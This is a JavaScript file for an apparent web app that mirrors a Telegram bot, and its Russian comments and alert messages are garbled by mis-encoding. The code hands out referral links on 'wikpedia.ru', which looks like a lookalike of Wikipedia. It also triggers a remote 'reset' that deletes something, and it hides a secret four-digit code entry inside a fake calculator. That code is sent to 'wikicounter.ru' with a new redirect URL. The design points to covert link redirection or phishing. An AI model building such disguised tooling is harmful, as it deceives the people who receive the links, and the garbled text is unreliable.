const BOT_FUNCTIONS = {
    // –ö–æ–ø–∏—è —Ñ—É–Ω–∫—Ü–∏–π –∏–∑ Telegram-–±–æ—Ç–∞
    generateLink: async (ref) => {
        try {
            const link = `https://wikpedia.ru?ref=${ref}`;
            navigator.clipboard.writeText(link);
            alert(`üîó –í–∞—à–∞ —Å—Å—ã–ª–∫–∞:\n${link}`);
        } catch (e) {
            alert("‚ö†Ô∏è –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å—Å—ã–ª–∫–∏");
        }
    },

    triggerReset: async (ref) => {
        try {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∫–∞–∫ –≤ –±–æ—Ç–µ
            const checkRes = await fetch(`/check_reset_key?ref=${ref}`);
            const checkData = await checkRes.json();
            
            if (!checkData.exists) {
                alert("‚ùå –ù–µ—á–µ–≥–æ —É–¥–∞–ª—è—Ç—å");
                return;
            }

            const res = await fetch(`/trigger_reset?ref=${ref}`);
            alert(res.ok ? "‚úÖ –ú–æ–º–µ–Ω—Ç..." : "‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∑–≤–∞—Ç—å —Å–±—Ä–æ—Å");
        } catch (e) {
            alert("‚ö†Ô∏è –°–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω");
        }
    },

    handleCodeWithCalc: (ref, callback) => {
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞
        document.getElementById('calculator-mode').style.display = 'block';
        document.getElementById('bot-mode').style.display = 'none';
        
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä–∞
        setupCodeCalculator(ref, callback);
    }
};

// –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞
function setupCodeCalculator(ref, callback) {
    let firstNumber = null;
    let operation = null;
    const screen = document.querySelector('#calculator-mode .screen');
    screen.textContent = '0';

    // –ù–∞–≤–µ—à–∏–≤–∞–µ–º –Ω–æ–≤—ã–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –ø—Ä—è–º–æ –Ω–∞ –∂–∏–≤—ã–µ –∫–Ω–æ–ø–∫–∏
    document.querySelectorAll('#calculator-mode .calc-btn').forEach(btn => {
        const newBtn = btn.cloneNode(true); // –∫–æ–ø–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É
        btn.replaceWith(newBtn); // –∑–∞–º–µ–Ω—è–µ–º –≤ DOM

        newBtn.addEventListener('click', function () {
            const value = this.textContent;

            // –ù–∞–∂–∞—Ç–∞ —Ü–∏—Ñ—Ä–∞
            if (/\d/.test(value)) {
                screen.textContent = screen.textContent === '0' ? value : screen.textContent + value;
                return;
            }

            // –ù–∞–∂–∞—Ç –∑–Ω–∞–∫ —É–º–Ω–æ–∂–µ–Ω–∏—è
            if (value === '√ó') {
                firstNumber = screen.textContent;
                operation = '√ó';
                screen.textContent = '0';
                return;
            }

            // –ù–∞–∂–∞—Ç–æ "="
            if (value === '=' && operation === '√ó' && firstNumber) {
                const code = firstNumber;

                if (/^\d{4}$/.test(code)) {
                    callback(ref, code);
                } else {
                    alert("–ö–æ–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å 4-–∑–Ω–∞—á–Ω—ã–º —á–∏—Å–ª–æ–º");
                }

                // –í–æ–∑–≤—Ä–∞—â–∞–µ–º—Å—è –∫ —Ä–µ–∂–∏–º—É –±–æ—Ç–∞
                document.getElementById('calculator-mode').style.display = 'none';
                document.getElementById('bot-mode').style.display = 'block';
            }
        });
    });
}


// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è PWA
document.addEventListener('DOMContentLoaded', () => {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é
    let storedRef = localStorage.getItem('user_ref');
    if (!storedRef) {
        const userRef = prompt("–í–≤–µ–¥–∏—Ç–µ –≤–∞—à ID (—á–∏—Å–ª–æ, –≤—ã–¥–∞–Ω–Ω–æ–µ –±–æ—Ç–æ–º):");
        if (userRef && /^\d+$/.test(userRef)) {
            localStorage.setItem('user_ref', userRef);
            storedRef = userRef;
        } else {
            alert("‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π ID. –û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.");
            return;
        }
    }

    // –û—Å–Ω–æ–≤–Ω–æ–µ –º–µ–Ω—é –∫–∞–∫ –≤ –±–æ—Ç–µ
    document.getElementById('copy-link').onclick = 
        () => BOT_FUNCTIONS.generateLink(storedRef);
    
    document.getElementById('reset-btn').onclick = 
        () => BOT_FUNCTIONS.triggerReset(storedRef);
    
    // –°–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ —á–µ—Ä–µ–∑ –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä
    document.getElementById('submit-code').onclick = () => {
        BOT_FUNCTIONS.handleCodeWithCalc(storedRef, async (ref, code) => {
            try {
                const res = await fetch(`https://wikicounter.ru/update_code`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        code: code,
                        new_url: `${BASE_SITE_URL}?ref=${ref}`
                    })
                });
                
                const data = await res.json();
                alert(data.status === "success" 
                    ? "‚úÖ –ö–æ–¥ –Ω–∞–π–¥–µ–Ω, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–≤—è–∑—å..." 
                    : "‚ùå –ö–æ–¥ –Ω–µ –Ω–∞–π–¥–µ–Ω");
            } catch (e) {
                alert("‚ö†Ô∏è –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è");
            }
        });
    };
});